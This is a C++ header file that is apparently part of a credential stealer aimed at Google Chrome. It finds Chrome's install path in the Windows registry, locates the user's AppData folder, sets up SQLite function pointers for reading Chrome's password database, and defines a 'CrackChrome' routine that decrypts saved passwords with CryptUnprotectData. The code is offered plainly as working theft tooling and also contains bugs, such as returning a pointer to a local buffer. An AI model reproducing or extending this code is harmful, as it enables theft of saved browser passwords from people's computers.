#pragma once 


//Lets see where Google Chrome application is installed
char * readRegistryValue(){
	LPCSTR value = "Path";
	HKEY hkey = NULL;
	char * sk = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe";

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, sk, 0, KEY_READ, &hkey) != ERROR_SUCCESS)
	{
		return NULL;
	}
	char path[MAX_PATH] = { 0 };
	DWORD dw = 260;
	RegQueryValueEx(hkey, value, 0, 0, (BYTE *)path, &dw);
	RegCloseKey(hkey);
	char *ret = new char[strlen(path) + 1];
	strcpy(ret, path);
	return ret;
	//delete[]ret;
}

char *CrackChrome(BYTE *pass){
	DATA_BLOB in;
	DATA_BLOB out;

	BYTE trick[1024];
	memcpy(trick, pass, 1024);
	int size = sizeof(trick) / sizeof(trick[0]);

	in.pbData = pass;
	in.cbData = size + 1;//we can't use strlen on a byte pointer,becouse of the NBs,so we have to be tricky dicky:)
	char str[1024] = "";

	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)){
		for (int i = 0; i<out.cbData; i++)
			str[i] = out.pbData[i];
		str[out.cbData] = '\0';

		return str;
	}
	else
		return NULL; //Error on decryption
}

//To get to Appdata\local
bool getPath(char *ret, int id){
	memset(ret, 0, sizeof(ret));
	if (SUCCEEDED(SHGetFolderPath(NULL, id | CSIDL_FLAG_CREATE, NULL, SHGFP_TYPE_CURRENT, ret)))
		return true;
	return false;
}

//SQLITE definitions
#define SQLITE_OK 0
#define SQLITE_ROW 100
#define SQLITE_API
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;

//SQLITE function pointers
typedef int(SQLITE_API *fpSqliteOpen)(const char *, sqlite3 **);
typedef int(SQLITE_API *fpSqlitePrepare_v2)(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);
typedef int(SQLITE_API *fpSqliteStep)(sqlite3_stmt *);
typedef const unsigned char *(SQLITE_API *fpSqliteColumnText)(sqlite3_stmt*, int);
typedef int(SQLITE_API *fpSqliteFinalize)(sqlite3_stmt *);
typedef int(SQLITE_API *fpSqliteClose)(sqlite3 *);

fpSqliteOpen sqlite3_open;
fpSqlitePrepare_v2 sqlite3_prepare_v2;
fpSqliteStep sqlite3_step;
fpSqliteColumnText sqlite3_column_text;
fpSqliteFinalize sqlite3_finalize;
fpSqliteClose sqlite3_close;